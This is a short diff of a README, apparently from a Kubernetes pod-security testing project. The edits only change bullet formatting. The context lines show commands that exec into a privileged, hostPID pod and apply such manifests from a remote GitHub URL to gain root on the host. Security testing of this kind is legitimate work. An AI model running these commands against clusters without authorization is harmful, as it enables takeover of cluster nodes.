@@ -27,7 +27,7 @@ Once you are root on the host, the privilege escalation paths are all the same a
 # Pod creation & access
 
 ## Exec pods
-* Create one or more of these resource types and exec into the pod
+Create one or more of these resource types and exec into the pod
 
 **Pod**  
 ```bash
@@ -36,7 +36,7 @@ kubectl exec -it priv-and-hostpid-exec-pod -- bash
 ```
 **Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/[RESOURCE_TYPE]/priv-and-hostpid-exec-[RESOURCE_TYPE].yaml 
